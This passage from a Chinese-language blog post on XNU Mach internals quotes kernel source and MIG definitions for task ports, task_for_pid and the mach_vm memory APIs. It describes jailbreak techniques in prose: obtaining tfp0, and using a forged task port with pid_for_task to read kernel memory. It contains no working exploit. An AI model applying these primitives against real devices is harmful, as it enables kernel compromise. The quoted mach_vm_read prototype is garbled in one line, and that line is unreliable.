<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_port_insert_right [kernel call]</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Inserts a right into a space, as if the space</span></span><br><span class="line"><span class="comment"> *		voluntarily received the right in a message,</span></span><br><span class="line"><span class="comment"> *		except that the right gets the specified name.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> *	Returns:</span></span><br><span class="line"><span class="comment"> *		KERN_SUCCESS		Inserted the right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is null.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is dead.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	The name isn&#x27;t a legal name.</span></span><br><span class="line"><span class="comment"> *		KERN_NAME_EXISTS	The name already denotes a right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	Message doesn&#x27;t carry a port right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_CAPABILITY	Port is null or dead.</span></span><br><span class="line"><span class="comment"> *		KERN_UREFS_OVERFLOW	Urefs limit would be exceeded.</span></span><br><span class="line"><span class="comment"> *		KERN_RIGHT_EXISTS	Space has rights under another name.</span></span><br><span class="line"><span class="comment"> *		KERN_RESOURCE_SHORTAGE	Couldn&#x27;t allocate memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_port_insert_right</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span>			space,</span></span><br><span class="line"><span class="params">	<span class="type">mach_port_name_t</span>		name,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>			poly,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_name_t</span>		polyPoly)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (space == IS_NULL)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!MACH_PORT_VALID(name) ||</span><br><span class="line">	    !MACH_MSG_TYPE_PORT_ANY_RIGHT(polyPoly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_VALUE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!IO_VALID((<span class="type">ipc_object_t</span>) poly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_CAPABILITY;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipc_object_copyout_name(space, (<span class="type">ipc_object_t</span>) poly, </span><br><span class="line">				       polyPoly, FALSE, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MIG-Mach接口生成器"><a href="#MIG-Mach接口生成器" class="headerlink" title="MIG-Mach接口生成器"></a>MIG-Mach接口生成器</h3><p>使用Mach API编写的许多代码都包含相同的样板代码，多次重复可能会导致复杂性，甚至导致安全漏洞，因此MIG非常方便。它基于MIG规范文件(defs)实现桩函数。客户端可以像调用任何其他C函数一样调用此桩函数，并且桩函数可以处理进出mach消息的数据的编组和解编组，从而控制发生在底层的所有Mach IPC实现。<br>MIG规范文件具有扩展名defs，并且在编译内核时，这些文件由mig处理并生成额外的文件，这些文件包含自动生成的MIG封装器。</p>
<p>以<code>osfmk/mach/task.defs</code>中的<code>task.defs</code>文件为例，每个defs文件都有一个子系统名称，后跟一个任意数字，该数字在文件的开头声明。task.defs文件的子系统名称为task，数字为3400。桩函数还可以检查传递给它的参数的有效性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">subsystem</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	KERNEL_SERVER</span></span><br><span class="line">	  KernelServer</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* KERNEL_SERVER */</span></span></span><br><span class="line">	  task <span class="number">3400</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Create a new task with an empty set of IPC rights,</span></span><br><span class="line"><span class="comment"> *	and having an address space constructed from the</span></span><br><span class="line"><span class="comment"> *	target task (or empty, if inherit_memory is FALSE).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_create</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task	: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		ledgers		: <span class="type">ledger_array_t</span>;</span></span><br><span class="line"><span class="params">		inherit_memory	: <span class="type">boolean_t</span>;</span></span><br><span class="line"><span class="params">	out	child_task	: <span class="type">task_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>如果要生成MIG封装器，则可以在包含def文件的目录运行mig。</p>
<p>在编译期间，mig工具根据子系统名称创建三个文件。例如对于task子系统，将创建以下文件：</p>
<ul>
<li>taskUser.c-该文件包含代理函数的实现，该代理函数负责将数据编组为消息并发送。它还负责解组返回的数据并将其发送回客户端</li>
<li>task.c-代理函数的原型</li>
<li>taskServer.c-桩函数的实现包含在此文件中</li>
</ul>
<p>在生成的文件中定义了许多大部分是函数的routine。如routine <code>task_set_exception_port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_set_exception_ports */</span></span><br><span class="line">mig_internal novalue _Xtask_set_exception_ports</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_port;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		NDR_record_t NDR;</span><br><span class="line">		<span class="type">exception_mask_t</span> exception_mask;</span><br><span class="line">		<span class="type">exception_behavior_t</span> behavior;</span><br><span class="line">		<span class="type">thread_state_flavor_t</span> new_flavor;</span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_set_exception_ports_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_set_exception_ports_t Reply __attribute__((unused));</span><br></pre></td></tr></table></figure>

<p><strong>审计这些函数中的代码也非常重要。</strong></p>
<h3 id="任务端口"><a href="#任务端口" class="headerlink" title="任务端口"></a>任务端口</h3><p>Mach端口的另一个有用的功能是它们充当对象的抽象，而该抽象是由Mach消息提供的，这些消息主要通过MIG进行转换。例如，主机Mach端口提供许多API，以获取有关主机的信息。<code>host_kernel_version()</code>函数将打印内核版本。这与<code>uname -r</code>命令使用的API相同。查看<code>osfmk/mach/mach_host.defs</code>文件将显示主机端口API提供的所有routine。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Return information about this host.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">host_info</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">host_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	host_info_out	: <span class="type">host_info_t</span>, CountInOut)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Get string describing current kernel version.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">host_kernel_version</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">	out	kernel_version	: <span class="type">kernel_version_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>类似，任务端口用作任务的抽象。可以在<code>osfmk/mach/task.def</code>或者BUILD文件夹中的<code>osfmk/mach/task.defs</code>找到这些API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the selected state which is to be installed on new </span></span><br><span class="line"><span class="comment"> * threads in the task as they are created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_get_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	old_state	: <span class="type">thread_state_t</span>, CountInOut)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set the selected state information to be installed on</span></span><br><span class="line"><span class="comment"> * all subsequently created threads in the task.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">task_set_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">		new_state	: <span class="type">thread_state_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Change the task&#x27;s physical footprint limit (in MB).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_set_phys_footprint_limit</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_limit	: <span class="type">int</span>;</span></span><br><span class="line"><span class="params">	out old_limit	: <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">routine <span class="title function_">task_suspend2</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task : <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">	out suspend_token : <span class="type">task_suspension_token_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这些API十分强大，可以与目标进程进行完全交互。具有进程的任务端口的发送权限将完全控制该任务，包括在目标任务内存区域中读取，写入和分配内存。这里提到的是进程(来自BSD)的任务(来自Mach)端口，需要注意的是，它们内部是有联系的。每个BSD进程都有一个对应的Mach任务，反之亦然。可以在<code>osfmk/kern/task.h</code>下找到task结构体，其中的<code>bsd_info</code>指向<code>bsd/sys/proc_internal.h</code>中的proc结构体。同样，proc结构体中的task是指向该进程的task结构体的指针。</p>
<p><img src="https://highaltitudehacks.com/images/21.png" alt="21"></p>
<p>使用Mach系统调用<code>task_for_pid()</code>，可以将与目标PID相对应的任务端口的发送权限发送给调用方。从<code>bsd/vm/vm_unix.c</code>中的以下注释可以看出，仅允许特权进程或具有相同用户ID的进程调用。除此之外，调用此API还需要某些权限<code>get-task-allow</code>和<code>task_for_pid-allow</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	task_for_pid</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Get the task port for another &quot;process&quot;, named by its</span></span><br><span class="line"><span class="comment"> *		process ID on the same host as &quot;target_task&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Only permitted to privileged processes, or processes</span></span><br><span class="line"><span class="comment"> *		with the same user ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Note: if pid == 0, an error is return no matter who is calling.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * XXX This should be a BSD system call, not a Mach trap!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_for_pid</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> task_for_pid_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	target_tport = args-&gt;target_tport;</span><br><span class="line">	<span class="type">int</span>			pid = args-&gt;pid;</span><br><span class="line">	<span class="type">user_addr_t</span>		task_addr = args-&gt;t;</span><br><span class="line">	<span class="type">proc_t</span> 			p = PROC_NULL;</span><br><span class="line">	<span class="type">task_t</span>			t1 = TASK_NULL;</span><br><span class="line">	<span class="type">task_t</span>			task = TASK_NULL;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	tret = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">ipc_port_t</span> 		tfpport = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">void</span> * sright;</span><br><span class="line">	<span class="type">int</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_TASKFORPID);</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	AUDIT_ARG(mach_port1, target_tport);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Always check if pid == 0 */</span></span><br><span class="line">	<span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">		(<span class="type">void</span> ) copyout((<span class="type">char</span> *)&amp;t1, task_addr, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>));</span><br><span class="line">		AUDIT_MACH_SYSCALL_EXIT(KERN_FAILURE);</span><br><span class="line">		<span class="keyword">return</span>(KERN_FAILURE);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>有一点是需要注意的，<code>task_for_pid()</code>始终会检查pid是否为0，以防止通过调用<code>task_for_pid(0)</code>获取到内核任务端口的发送权限，这个操作叫tfp0。在之前，一旦能够任意读写内核内存，越狱程序就会patch该检查并调用task_for_pid(0)。但是随着KPP和AMCC&#x2F;KTRR的出现，不再能patch内核，因此使用了其它技术。<strong>tfp0这个叫法仍然存在，用于表示读写内核内存。</strong></p>
<p>另一个非常常用的API是Mach系统调用<code>pid_for_task()</code>，用于查找与给定Mach任务相对应的进程的pid。它通常做的是查找task结构体，查找其中的<code>bsd_info</code>指向的内核中的proc结构体，并从proc结构体中读取p_pid。此技术已被广泛用于通过创建伪造的任务端口一次读取任意四个字节的内核内存（因为pid为32位）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pid_for_task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Find the BSD process ID for the Mach task associated with the given Mach port </span></span><br><span class="line"><span class="comment"> * name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Parameters:	args		User argument descriptor (see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Indirect parameters:	args-&gt;t		Mach port name</span></span><br><span class="line"><span class="comment"> * 			args-&gt;pid	Process ID (returned value; see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:	KERL_SUCCESS	Success</span></span><br><span class="line"><span class="comment"> * 		KERN_FAILURE	Not success           </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implicit returns: args-&gt;pid		Process ID</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">pid_for_task</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> pid_for_task_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	t = args-&gt;t;</span><br><span class="line">	<span class="type">user_addr_t</span>		pid_addr  = args-&gt;pid;  </span><br><span class="line">	<span class="type">proc_t</span> p;</span><br><span class="line">	<span class="type">task_t</span>		t1;</span><br><span class="line">	<span class="type">int</span>	pid = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">kern_return_t</span>	err = KERN_SUCCESS;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);</span><br><span class="line">	AUDIT_ARG(mach_port1, t);</span><br><span class="line"></span><br><span class="line">	t1 = port_name_to_task_inspect(t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t1 == TASK_NULL) &#123;</span><br><span class="line">		err = KERN_FAILURE;</span><br><span class="line">		<span class="keyword">goto</span> pftout;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = get_bsdtask_info(t1);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			pid  = proc_pid(p);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_corpsetask(t1)) &#123;</span><br><span class="line">			pid = task_pid(t1);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			err = KERN_FAILURE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	task_deallocate(t1);</span><br><span class="line">pftout:</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	(<span class="type">void</span>) copyout((<span class="type">char</span> *) &amp;pid, pid_addr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	AUDIT_MACH_SYSCALL_EXIT(err);</span><br><span class="line">	<span class="keyword">return</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内核任务端口"><a href="#内核任务端口" class="headerlink" title="内核任务端口"></a>内核任务端口</h3><p>内核被分配了PID 0，相应的无进程任务被称为内核任务。拥有内核任务的发送权限可以完全控制内核内存，对内核内存进行读写，还可以通过分配内存来注入任意代码（EXP执行原理）。<br>如前所述，调用<code>task_for_pid(0)</code>的古老方法之一是patch对pid&#x3D;0的检查。macOS上不安全内核<code>(#if defined SECURE_KERNEL)</code>也有一个<code>processer_set_tasks()</code> API会将内核任务端口作为第一个参数返回。<br>获得内核任务端口后，以下五个MACH API经常用于与内存进行交互。需要注意的是，要成功执行此函数，调用者必须拥有目标任务的任务端口的发送权限。如果查看函数原型，则第一个参数是目标任务<code>(vm_map_t target_task)</code>。可以将内核任务端口<code>(mach_port_t tfp0)</code>作为第一个参数传递给它。具体的代码在<code>libsyscall/mach/mach_vm.c</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Allocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_allocate</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> *address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> flags</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Deallocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_deallocate</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_vm_read</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span>		<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span>	addr,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span>	size,</span></span><br><span class="line"><span class="params">	<span class="type">pointer_t</span>		*data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span>	*data_size)</span> *data_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_write</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">vm_offset_t</span> data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span> dataCnt</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Sets the Protection attribute for a given memory range in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_protect</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size, </span></span><br><span class="line"><span class="params">	<span class="type">boolean_t</span> set_maximum,</span></span><br><span class="line"><span class="params">	<span class="type">svm_prot_t</span> new_protection)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Mach凭证"><a href="#Mach凭证" class="headerlink" title="Mach凭证"></a>Mach凭证</h3><p>Mach凭证（<code>osfmk/ipc/ipc_voucher.h</code>）在内核中的表示为：</p>
